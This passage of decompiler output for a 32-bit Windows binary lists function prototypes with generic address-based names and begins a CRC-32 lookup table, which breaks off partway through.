int32_t function_401ed0(int32_t a1, uint32_t a2, int32_t a3, int32_t a4);
int32_t function_401f90(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4020b0(int32_t a1, int32_t a2);
int32_t function_402130(int32_t a1, int32_t a2);
int32_t function_4021a0(void);
int32_t function_402310(int32_t a1, int32_t a2);
int32_t function_4023f0(int32_t a1);
int32_t function_4024f0(uint32_t a1, int32_t a2);
int32_t function_402660(int32_t a1);
int32_t function_4026f0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_402940(int32_t a1, int32_t a2, int32_t a3, int32_t a4, uint32_t a5);
int32_t function_402bd0(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_402c80(void);
int32_t function_402cd0(void);
int32_t function_402d60(int32_t a1);
int32_t function_402e90(int32_t a1);
int32_t function_403000(int32_t a1);
int32_t function_403040(int32_t a1);
int32_t function_403080(int32_t a1);
int32_t function_403170(uint32_t a1);
int32_t function_403290(int32_t * a1, int32_t * a2);
int32_t function_4034f0(uint32_t a1);
int32_t function_4035b0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_403f60(int32_t a1);
int32_t function_4040b0(int32_t a1, int32_t a2);
int32_t function_4043d0(void);
int32_t function_404440(void);
int32_t function_404550(int32_t a1);
int32_t function_404630(int32_t a1);
int32_t function_4046e0(void);
int32_t function_404970(int32_t a1);
int32_t function_404b60(int32_t lpString2);
int32_t function_404d30(int32_t lpNetResource);
int32_t function_404e00(void);
int32_t function_404e30(uint32_t a1, int32_t a2, int32_t a3);
int32_t function_405140(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_405370(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4053d0(int32_t * a1, int32_t a2);
int32_t function_4055e0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405790(void);
int32_t function_4057a0(void);
int32_t function_405a30(void);
int32_t function_405f50(int32_t a1, uint32_t a2);
int32_t function_406090(void);
int32_t function_40609b(int32_t a1);
int32_t function_4060cb(int32_t a1);
int32_t function_4060d9(void);
int32_t function_406100(uint32_t a1);
int32_t function_40611d(void);
int32_t function_406228(int32_t * a1);
int32_t function_406272(int32_t * a1);
int32_t function_4062c4(void);
int32_t function_406306(int32_t dwMilliseconds);
int32_t function_406366(void);
int32_t function_40636b(int32_t a1, uint32_t a2);
int32_t function_4063af(void);
int32_t function_4063e1(int32_t a1);
int32_t function_40641a(int32_t a1);
int32_t function_4064c4(void);
int32_t function_40654e(int32_t a1);
int32_t function_40656b(int32_t a1, int32_t a2);
int32_t function_406593(int32_t a1, int32_t a2);
int32_t function_4065ce(int32_t a1);
int32_t function_4065e3(void);
int32_t function_4065ec(void);
int32_t function_406698(void);
int32_t function_4066aa(void);
int32_t function_406826(int32_t a1);
int32_t function_406841(int32_t a1);
int32_t function_406859(int32_t a1);
int32_t function_406874(int32_t a1);
int32_t function_40688c(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4068b8(void);
int32_t function_4068c9(char a1);
int32_t function_4068f6(void);
int32_t function_406913(void);
int32_t function_40693d(void);
int32_t function_406942(int32_t a1, int32_t a2);
int32_t function_406a5e(void);
int32_t function_406a91(void);
int32_t function_406a94(void);
int32_t (*function_406ad7(int32_t (*lpTopLevelExceptionFilter)(struct _EXCEPTION_POINTERS *)))(struct _EXCEPTION_POINTERS *);
int32_t function_406ae3(int32_t a1);
int32_t function_406b24(int32_t a1);
int32_t function_406b2c(void);
int32_t function_406b3d(void);
int32_t function_406b3e(int32_t a1);
int32_t function_406cd7(void);
int32_t function_406cdb(int32_t a1);
int32_t function_406cf0(int32_t * a1, int32_t a2, int32_t a3);
int32_t function_406d36(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_406d4b(int32_t a1, int32_t a2);
int32_t function_406d9a(void);
int32_t function_406de5(void);
void function_406deb(int32_t * ListHead);
int32_t function_406df7(void);
int32_t function_406dfa(void);
int32_t function_406e21(void);
int32_t function_406e3e(void);
int32_t function_406e4a(void);
int32_t function_406e50(void);
int32_t function_406e56(void);
int32_t function_406e82(void);
int32_t function_406eae(char a1);
int32_t function_406ed1(int32_t ExceptionInfo);
int32_t function_406ef9(int32_t a1);
int32_t function_406ff4(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40702b(int32_t a1);
int32_t function_407046(int32_t a1);
int32_t function_407067(int32_t a1);
int32_t function_407082(char * a1);
int32_t function_407102(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_4071df(int32_t a1, int32_t a2, int32_t a3, int32_t * a4, int32_t * a5);
int32_t function_407257(int32_t result, int32_t a2);
int32_t function_407282(int32_t a1);
int32_t function_407289(int32_t TargetFrame, int32_t ExceptionRecord);
int32_t function_4072de(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40730f(int32_t result, int32_t a2);
int32_t function_407333(int32_t a1);
int32_t function_407378(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40740f(void);
int32_t function_407412(int32_t a1);
int32_t function_407417(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40744d(void);
int32_t function_407476(int32_t a1);
int32_t function_4074a0(int32_t a1, int32_t a2);
int32_t function_4074e0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_407637(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40769a(int32_t a1);
int32_t function_4076b9(int32_t * dwExceptionCode, int32_t * a2);
int32_t function_407730(int32_t result, int32_t a2, int32_t a3);
int32_t function_40788a(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4078c6(int32_t a1);
int32_t function_4078e2(void);
int32_t function_4078f0(void);
int32_t function_407982(void);
int32_t function_4079c6(int32_t a1);
int32_t function_4079f0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_407a3c(int32_t a1);
int32_t function_407a57(void);
int32_t function_407a6f(int32_t a1);
int32_t function_407a8e(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t function_407b18(void);
int32_t function_407b22(void);
int32_t function_407ba8(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_407bc9(void);
int32_t function_407c4a(void);
int32_t function_407c84(char a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10);
int32_t function_407cfd(int32_t a1);
int32_t function_407d47(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, char a6, int32_t a7, int32_t a8);
int32_t function_4080c8(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t result3, int32_t a7, int32_t a8);
int32_t function_4081e3(int32_t a1, int32_t a2);
int32_t function_40827f(int32_t a1, int32_t a2);
int32_t function_40828f(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4082a2(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_408324(void);
int32_t function_408331(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_408465(void);
int32_t function_408518(void);
int32_t function_408532(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_40862f(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4086bd(int32_t a1);
int32_t function_4086ed(int32_t a1, int32_t a2);
int32_t function_40871a(void);
int32_t function_408756(void);
int32_t function_408785(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_40884b(int32_t a1, char * lpProcName, int32_t * a3, char * a4, int32_t a5, int32_t a6);
int32_t function_4088ba(int32_t a1);
int32_t function_4088f5(int32_t dwTlsIndex);
int32_t function_408930(int32_t dwTlsIndex);
int32_t function_40896b(int32_t dwTlsIndex, int32_t lpTlsValue);
int32_t function_4089a9(int32_t lpCriticalSection, int32_t dwSpinCount, int32_t a3);
int32_t function_4089f0(void);
int32_t function_408a19(int32_t a1);
int32_t function_408a4b(void);
int32_t function_408a60(int32_t a1, int32_t a2, int32_t a3);
int32_t function_408af0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_408b38(int32_t a1);
int32_t function_408b60(int32_t a1);
int32_t function_408b78(void);
int32_t function_408b94(void);
int32_t function_408bb0(int32_t a1, int32_t * a2);
int32_t function_408bd0(int32_t TargetFrame);
int32_t function_408bf1(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_408c36(int32_t a1, int32_t a2, int32_t a3);
int32_t function_408cba(void);
int32_t function_408ce0(int32_t a1, int32_t * a2);
int32_t function_408cec(int32_t a1);
int32_t function_408cf7(int32_t a1, int32_t a2);
int32_t function_408d0b(void);
int32_t function_408d0e(void);
int32_t function_408d2b(void);
int32_t function_408dc1(int32_t a1, int32_t a2);
int32_t function_408dce(int32_t a1);
int32_t function_408df4(int32_t a1, int32_t a2);
int32_t function_408e19(int32_t a1);
int32_t function_408e60(int32_t result, int32_t a2, int32_t a3);
int32_t function_4093e0(int32_t result, int32_t a2, int32_t a3);
int32_t function_409954(int32_t a1, int32_t a2);
int32_t function_4099d7(void);
int32_t function_4099f8(int32_t a1);
int32_t function_409a29(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_409b64(int32_t a1, int32_t a2);
int32_t function_409b66(int32_t a1);
int32_t function_409b78(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_409c03(void);
int32_t function_409c20(void);
int32_t function_409c53(void);
int32_t function_409c5e(int32_t a1);
int32_t function_409c60(int32_t a1);
int32_t function_409c72(int32_t a1);
int32_t function_409cb6(int32_t a1, int32_t a2, int32_t a3);
int32_t function_409cff(void);
int32_t function_409d08(int32_t a1, int32_t a2);
int32_t function_409e7b(uint32_t a1);
int32_t function_409e9a(int32_t a1);
int32_t function_409ead(int32_t a1, int32_t a2, int32_t a3);
int32_t function_409f9c(void);
int32_t function_409fb7(void);
int32_t function_409fc0(void);
int32_t function_409fc6(int32_t a1);
int32_t function_40a007(void);
int32_t function_40a04b(int32_t a1);
int32_t function_40a0b5(int32_t a1);
int32_t function_40a0b7(int32_t result);
int32_t function_40a0c4(void);
int32_t function_40a0cf(void);
int32_t function_40a0d3(void);
int32_t function_40a0de(void);
int32_t function_40a0e2(int32_t a1);
int32_t function_40a0f3(int32_t a1);
int32_t function_40a0f8(int32_t a1);
int32_t function_40a130(int32_t a1);
int32_t function_40a141(int32_t a1);
int32_t function_40a146(int32_t a1);
int32_t function_40a26a(int32_t a1, int32_t a2, int32_t a3, int32_t * a4, int32_t * a5);
int32_t function_40a3df(uint32_t a1, uint32_t a2, uint32_t a3);
int32_t function_40a434(int32_t a1);
int32_t function_40a43f(void);
int32_t function_40a498(int32_t a1);
int32_t function_40a569(int32_t a1);
int32_t function_40a598(int32_t a1);
int32_t function_40a59a(int32_t a1);
int32_t function_40a5da(int32_t a1);
int32_t function_40a5f5(int32_t a1);
int32_t function_40a60e(void);
int32_t function_40a645(void);
int32_t function_40a64a(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40a68f(void);
int32_t function_40a69b(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40a6e0(void);
int32_t function_40a6ec(int32_t a1, int32_t * a2, int32_t * a3, int32_t a4);
int32_t function_40a714(int32_t a1, int32_t * a2, int32_t * a3, int32_t * a4, int32_t a5);
int32_t function_40a73c(void);
int32_t function_40a85c(void);
int32_t function_40a99d(int32_t a1, int32_t a2);
int32_t function_40a9b3(void);
int32_t function_40a9d0(int32_t * a1);
int32_t function_40aa0d(int32_t * a1, int32_t a2, int32_t a3);
int32_t function_40aa31(void);
int32_t function_40aa43(void);
int32_t function_40aa5d(void);
int32_t function_40aa65(void);
int32_t function_40aaa2(void);
int32_t function_40aaab(void);
int32_t function_40ab22(void);
int32_t function_40ab34(int32_t a1, int32_t a2);
int32_t function_40ab46(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40ab4c(int32_t result, int32_t a2);
int32_t function_40ab5b(void);
int32_t function_40ab74(int32_t a1);
int32_t function_40ab88(void);
int32_t function_40ab8a(int32_t a1);
int32_t function_40abd1(int32_t a1);
int32_t function_40abe6(void);
int32_t function_40ac39(int32_t * a1, int32_t * a2);
int32_t function_40ac95(int32_t * a1, int32_t * a2);
int32_t function_40acda(int32_t a1);
int32_t function_40ad17(void);
int32_t function_40ad22(void);
int32_t function_40ad6b(void);
int32_t function_40ad74(int32_t a1);
int32_t function_40add6(void);
int32_t function_40addc(uint32_t a1);
int32_t function_40ae0b(void);
int32_t function_40ae11(void);
int32_t function_40ae16(void);
int32_t function_40ae54(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40aeb1(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40af0b(void);
int32_t function_40af50(void);
int32_t function_40af59(int32_t a1, int32_t a2, int32_t result);
int32_t function_40afa0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40b018(int32_t a1);
int32_t function_40b05b(void);
int32_t function_40b05d(int32_t a1);
int32_t function_40b07e(void);
int32_t function_40b091(void);
int32_t function_40b0a4(int32_t * a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40b0a6(int32_t a1, int32_t a2, uint32_t a3, int32_t a4);
int32_t function_40b257(int32_t * a1, int32_t a2, int32_t a3);
int32_t function_40b259(int32_t result, uint32_t a2, int32_t a3);
int32_t function_40b2c4(int32_t a1);
int32_t function_40b2c6(int32_t a1);
int32_t function_40b33a(int32_t * a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40b33c(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40b419(int32_t * a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40b41b(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40b507(int32_t * a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40b509(int32_t a1, int32_t a2, uint32_t a3, int32_t a4);
int32_t function_40b634(int32_t a1);
int32_t function_40b6f6(void);
int32_t function_40b71f(int32_t a1, int32_t lpBuffer, int32_t nNumberOfBytesToWrite);
int32_t function_40b92b(int32_t a1);
int32_t function_40b92d(int32_t a1);
int32_t function_40b951(void);
int32_t function_40ba1b(void);
int32_t function_40ba65(int32_t a1);
int32_t function_40ba79(int32_t a1);
int32_t function_40ba8d(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40baf3(int32_t a1);
int32_t function_40bb3a(int32_t a1);
int32_t function_40bb43(int32_t a1);
int32_t function_40bbe8(void);
int32_t function_40bc12(void);
int32_t function_40bc1b(int32_t a1, int32_t a2);
int32_t function_40bc41(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40bc85(void);
int32_t function_40bc91(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40bce6(void);
int32_t function_40bcf2(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40bd31(void);
int32_t function_40bd3d(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40bd79(void);
int32_t function_40bd85(int32_t a1, int32_t * a2);
int32_t function_40bd87(int32_t a1, int32_t a2);
int32_t function_40bdad(int32_t a1, int32_t * a2);
int32_t function_40bdd5(int32_t a1, int32_t * a2);
int32_t function_40bdd7(int32_t a1, int32_t a2);
int32_t function_40bdfd(int32_t a1, int32_t * a2, int32_t a3, int32_t * a4, int32_t a5);
int32_t function_40be25(int32_t a1);
int32_t function_40bea0(int32_t a1);
int32_t function_40bebf(int32_t a1, int32_t a2);
int32_t function_40bf68(int32_t a1, int32_t a2);
int32_t function_40bfb3(void);
int32_t function_40c037(void);
int32_t function_40c0bc(void);
int32_t function_40c0e8(int32_t a1);
int32_t function_40c102(int32_t a1, int32_t a2);
int32_t function_40c12f(int32_t a1, int32_t a2);
int32_t function_40c15c(int32_t lpMem);
int32_t function_40c196(uint32_t a1);
int32_t function_40c1e4(int32_t lpWideCharStr, int32_t a2, uint32_t a3, int32_t a4, int32_t a5);
int32_t function_40c2de(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40c2f8(void);
int32_t function_40c2fa(void);
int32_t function_40c3ae(void);
int32_t function_40c3b0(void);
int32_t function_40c464(void);
int32_t function_40c4b1(void);
int32_t function_40c4bc(void);
int32_t function_40c4e8(void);
int32_t function_40c527(int32_t a1);
int32_t function_40c53e(void);
int32_t function_40c56f(int32_t a1);
int32_t function_40c586(int32_t a1, char * a2, int32_t * a3, int32_t * a4, int32_t a5, int32_t a6, int32_t a7);
int32_t function_40c622(int32_t a1);
int32_t function_40c69d(int32_t a1);
int32_t function_40c6f3(int32_t dwTlsIndex);
int32_t function_40c749(int32_t dwTlsIndex);
int32_t function_40c79f(int32_t dwTlsIndex, int32_t lpTlsValue);
int32_t function_40c7f8(int32_t lpCriticalSection, int32_t dwSpinCount, int32_t a3);
int32_t function_40c85a(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9);
int32_t function_40c8e2(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t function_40c93e(void);
int32_t function_40c964(int32_t a1);
int32_t function_40c9ed(char a1);
int32_t function_40ca21(uint32_t a1, uint32_t a2);
int32_t function_40ca80(uint32_t a1, uint32_t a2);
int32_t function_40ca96(int32_t a1, int32_t a2);
int32_t function_40cc26(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40ccbc(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40ce40(void);
int32_t function_40ce65(int32_t a1);
int32_t function_40ce9a(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40cf21(int32_t a1, int32_t * a2);
int32_t function_40cf2c(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40cf63(void);
int32_t function_40cf6f(int32_t a1, int32_t * a2);
int32_t function_40cf97(void);
int32_t function_40d05b(int32_t a1);
int32_t function_40d099(int32_t a1);
int32_t function_40d10c(int32_t a1);
int32_t function_40d171(int32_t a1);
int32_t function_40d305(int32_t a1, int32_t a2);
int32_t function_40d406(void);
int32_t function_40d424(int32_t a1);
int32_t function_40d4b5(void);
int32_t function_40d4c6(int32_t a1, int32_t a2);
int32_t function_40d6b7(int32_t * a1, uint32_t a2, int32_t a3, uint32_t a4);
int32_t function_40d738(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_40d791(int32_t a1);
int32_t function_40d7a9(void);
int32_t function_40d7c2(int32_t a1);
int32_t function_40d7f9(void);
int32_t function_40d87c(int32_t a1, uint32_t a2, uint32_t a3);
int32_t function_40d8f4(void);
int32_t function_40d905(void);
int32_t function_40d90f(int32_t * a1, int32_t * a2);
int32_t function_40d992(int32_t * a1, int32_t * a2);
int32_t function_40d9df(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40da2d(void);
int32_t function_40da39(int32_t a1, int32_t * a2, int32_t a3, int32_t a4);
int32_t function_40da61(int32_t a1);
int32_t function_40daa3(int32_t a1, int32_t a2);
int32_t function_40dacb(void);
int32_t function_40dae2(int32_t a1);
int32_t function_40db1d(void);
int32_t function_40db26(int32_t a1);
int32_t function_40dce6(void);
int32_t function_40dcf5(void);
int32_t function_40dd02(int32_t a1);
int32_t function_40dd26(void);
int32_t function_40dd2e(void);
int32_t function_40dda8(int32_t a1);
int32_t function_40dddd(int32_t a1);
int32_t function_40de6c(void);
int32_t function_40de75(int32_t a1);
int32_t function_40de98(int32_t a1);
int32_t function_40debb(uint32_t a1);
int32_t function_40df4c(uint32_t a1);
int32_t function_40dfb6(int32_t a1);
int32_t function_40e0b4(int32_t a1);
int32_t function_40e11d(uint32_t a1, int32_t a2);
int32_t function_40e159(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40e23d(int32_t a1, int32_t dwInfoType, char * lpMultiByteStr, int32_t cbMultiByte, int32_t * lpCharType, int32_t a6, int32_t a7);
int32_t function_40e35a(int32_t a1);
int32_t function_40e37a(int32_t a1);
int32_t function_40e3f7(int32_t a1);
int32_t function_40e541(int32_t a1);
int32_t function_40e56a(int32_t a1);
int32_t function_40e59a(int32_t a1);
int32_t function_40e5c3(int32_t a1);
int32_t function_40e644(int32_t a1, int32_t a2);
int32_t function_40e6aa(void);
int32_t function_40e6bb(int32_t * a1, int32_t result);
int32_t function_40e70b(uint32_t a1);
int32_t function_40e7b6(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40eab8(uint32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40eb51(uint32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40eba7(int32_t a1, int32_t a2, int32_t lpNewFilePointer, int32_t a4, int32_t a5);
int32_t function_40ec25(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9);
int32_t function_40ec40(int32_t a1);
int32_t function_40ec85(void);
int32_t function_40ed1c(void);
int32_t function_40ed25(int32_t a1);
int32_t function_40ed63(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40edef(void);
int32_t function_40edfb(int32_t a1, int32_t * a2, int32_t a3, int32_t * a4, int32_t a5);
int32_t function_40ee23(uint32_t a1);
int32_t function_40ee92(int32_t a1, int32_t * a2);
int32_t function_40eecb(int32_t * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9);
int32_t function_40f0e8(int32_t a1, int32_t a2, int32_t a3, char * a4, int32_t a5, int32_t * a6, int32_t a7, int32_t a8, int32_t a9);
int32_t function_40f133(int32_t a1, int32_t a2);
int32_t function_40f1ef(int32_t a1);
int32_t function_40f220(uint32_t a1, uint32_t a2, int32_t a3, int32_t a4);
int32_t function_40f2c0(int32_t a1, int32_t result, int32_t a3);
int32_t function_40f300(int32_t a1, uint32_t a2, uint32_t a3, int32_t a4);
int32_t function_40f69a(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40f74b(int32_t a1);
int32_t function_40f760(int16_t a1, int32_t a2);
int32_t function_40f7a0(int32_t a1, int32_t a2);
int32_t function_40f7b7(uint32_t a1, uint32_t a2, int32_t a3, int32_t a4);
int32_t function_40f844(void);
int32_t function_40f853(int32_t lpMem, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_40f886(int32_t a1, uint32_t a2);
int32_t function_40f8ef(int32_t a1);
int32_t function_40f965(void);
int32_t function_40f967(void);
int32_t function_40f978(void);
int32_t function_40f97a(int32_t a1, int32_t a2);
int32_t function_40f9a4(void);
int32_t function_40f9a6(int32_t a1);
int32_t function_40f9ff(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40fa01(void);
int32_t function_40fa11(int32_t a1, int32_t a2);
int32_t function_40fa30(void);
int32_t function_40fa47(int32_t a1);
int32_t function_40fabd(void);
int32_t function_40fb33(void);
int32_t function_40fb3d(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_40fb60(int32_t a1, int32_t a2, int32_t a3);
float80_t function_40fcb0(int64_t a1);
int32_t function_40fdcd(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40fe43(void);
int32_t function_40fe4f(int32_t a1, int32_t * a2, int32_t a3, int32_t * a4, int32_t a5);
int32_t function_40fe77(uint32_t a1);
int32_t function_40fef6(int32_t a1);
int32_t function_40ff92(int32_t a1);
int32_t function_40ffcd(void);
int32_t function_40ffe0(void);
float80_t function_40fff8(int32_t a1);
int32_t function_41026b(void);
float80_t function_4102d8(void);
float80_t function_4102ea(void);
float80_t function_410304(void);
int32_t function_410314(void);
int32_t function_410370(int32_t a1);
float80_t function_41039f(void);
float80_t function_4103b1(void);
float80_t function_4103be(void);
int32_t function_410401(void);
int32_t function_410435(void);
int32_t function_410470(void);
int32_t function_4104d7(void);
float80_t function_410568(void);
int32_t function_41056d(void);
float80_t function_410576(void);
int32_t function_41057b(void);
float80_t function_410588(void);
float80_t function_41058f(void);
float80_t function_4105ba(void);
float80_t function_4105e4(void);
int32_t function_410623(void);
int32_t function_410640(void);
int32_t function_41065d(void);
float80_t function_410670(void);
int32_t function_410685(int32_t a1);
int32_t function_41069c(void);
int32_t function_4106b5(void);
int32_t function_4106f8(float80_t a1);
int32_t function_41070e(int32_t a1);
int32_t function_41071b(int32_t a1);
int32_t function_410745(void);
int32_t function_410759(void);
int32_t function_41076d(float80_t a1);
int32_t function_410800(int32_t a1, int32_t result);
int32_t function_410817(int32_t a1, int32_t a2, int32_t a3);
int32_t function_410853(int64_t * a1, int64_t * a2, int64_t * a3, int32_t a4);
int32_t function_410a6b(int32_t a1, int32_t a2);
int32_t function_410b30(int32_t a1, int32_t a2, int32_t a3);
int32_t function_410b91(float80_t a1, int32_t a2, int32_t a3);
int32_t function_410bfb(int864_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_410d26(int32_t a1, int32_t * a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
float80_t function_410e31(float80_t a1, int32_t a2);
int32_t function_410e47(int32_t a1);
int32_t function_410e7b(int32_t a1, int32_t a2, float80_t a3, float80_t a4, int32_t a5, int32_t a6);
int32_t function_410f49(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_411129(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_41114c(int32_t * a1, int32_t * a2, int32_t a3, int32_t a4, int32_t * a5, int32_t * a6, int32_t a7);
int32_t function_41143d(int32_t a1);
int32_t function_41146c(int32_t a1, int32_t a2, float80_t a3, float80_t a4, float80_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9);
int32_t function_41150e(float80_t a1, int32_t a2, int32_t * a3, int32_t result, int32_t a5, int32_t a6);
float80_t function_4115e2(float80_t result, int32_t a2, int32_t a3);
int32_t function_411611(float80_t a1, int32_t a2, int32_t a3);
int32_t function_41166f(float80_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
bool function_411713(int32_t ProcessorFeature);
int32_t function_411720(int32_t a1, uint32_t a2);
int32_t function_411770(int32_t * a1);
int32_t function_411830(int32_t a1);
int32_t function_411863(int32_t a1, int32_t a2);
int32_t function_4118a0(uint32_t a1, uint32_t a2, uint32_t a3, int32_t a4);
int32_t function_411940(int32_t * a1, int32_t a2, int32_t a3);
int32_t function_411989(void);
int32_t function_4119a0(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_4119e0(int32_t result);
int32_t function_411a10(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_411af0(void);
int32_t function_411b10(void);
int32_t function_411b26(void);
int32_t function_411b40(void);
int32_t function_411b60(void);
int32_t function_411c20(int32_t a1, unsigned char a2);
int32_t function_411d60(int32_t a1, unsigned char a2);
int32_t function_411e90(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_411f3a(int32_t a1);
int32_t function_411f55(int32_t a1);
int32_t function_411f70(void);

// --------------------- Global Variables ---------------------

// Detected cryptographic pattern: CRC_32_IEEE_802_3_poly_0x04C11DB7 (32-bit, little endian)
int32_t CRC_32_IEEE_802_3_poly_0x04C11DB7_at_417028[256] = {0, 0x4c11db7, 0x9823b6e, 0xd4326d9, 0x130476dc, 0x17c56b6b, 0x1a864db2, 0x1e475005, 0x2608edb8, 0x22c9f00f, 0x2f8ad6d6, 0x2b4bcb61, 0x350c9b64, 0x31cd86d3, 0x3c8ea00a, 0x384fbdbd, 0x4c11db70, 0x48d0c6c7, 0x4593e01e, 0x4152fda9, 0x5f15adac, 0x5bd4b01b, 0x569796c2, 0x52568b75, 0x6a1936c8, 0x6ed82b7f, 0x639b0da6, 0x675a1011, 0x791d4014, 0x7ddc5da3, 0x709f7b7a, 0x745e66cd, -0x67dc4920, -0x631d54a9, -0x6e5e7272, -0x6a9f6fc7, -0x74d83fc4, -0x70192275, -0x7d5a04ae, -0x799b191b, -0x41d4a4a8, -0x4515b911, -0x48569fca, -0x4c97827f, -0x52d0d27c, -0x5611cfcd, -0x5b52e916, -0x5f93f4a3, -0x2bcd9270, -0x2f0c8fd9, -0x224fa902, -0x268eb4b7, -0x38c9e4b4, -0x3c08f905, -0x314bdfde, -0x358ac26b, -0xdc57fd8, -0x9046261, -0x44744ba, -0x86590f, -0x1ec1090c, -0x1a0014bd, -0x17433266, -0x13822fd3, 0x34867077, 0x30476dc0, 0x3d044b19, 0x39c556ae, 0x278206ab, 0x23431b1c, 0x2e003dc5, 0x2ac12072, 0x128e9dcf, 0x164f8078, 0x1b0ca6a1, 0x1fcdbb16, 0x18aeb13, 0x54bf6a4, 0x808d07d, 0xcc9cdca, 0x7897ab07, 0x7c56b6b0, 0x71159069, 0x75d48dde, 0x6b93dddb, 0x6f52c06c, 0x6211e6b5, 0x66d0fb02, 0x5e9f46bf, 0x5a5e5b08, 0x571d7dd1, 0x53dc6066, 0x4d9b3063, 0x495a2dd4, 0x44190b0d, 0x40d816ba, -0x535a3969, -0x579b24e0, -0x5ad80207, -0x5e191fb2, -0x405e4fb5, -0x449f5204, -0x49dc74db, -0x4d1d696e, -0x7552d4d1, -0x7193c968, -0x7cd0efbf, -0x7811f20a, -0x6656a20d, -0x6297bfbc, 